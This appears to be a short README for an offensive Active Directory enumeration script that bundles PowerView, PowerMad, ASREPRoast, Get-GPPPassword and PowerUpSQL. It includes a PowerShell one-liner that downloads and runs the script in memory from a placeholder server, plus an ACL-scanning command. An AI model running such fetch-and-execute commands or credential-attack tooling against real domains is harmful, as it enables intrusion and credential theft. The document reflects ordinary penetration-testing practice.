## What is this?
ADEN is a local enumeration script for active directory environments, it is a carefully put together merge of several enumeration and exploitation projects:

- PowerView
- PowerMad
- ASREPRoast
- Get-GPPPassword
- PowerUpSQL

It is to be used as an all-in-one enumeration routine to spin off when you are in a domain user's session.//
Big credits to all the authors of the above mentioned tools! You are awesome.


## How to use?
From a domain's user powershell session:
```powershell
iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-ADEnum
```
The script will perform a number of checks that you can directly see on a clear output. The only thing it doesn't do is ACL enumeration, I recommend you do this once you know your user context, then you can issue manually a command like this:
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "[YOUR_GROUP]"} | select ObjectDN, IdentityReference, ActiveDirectoryRights, AccessControlType
```
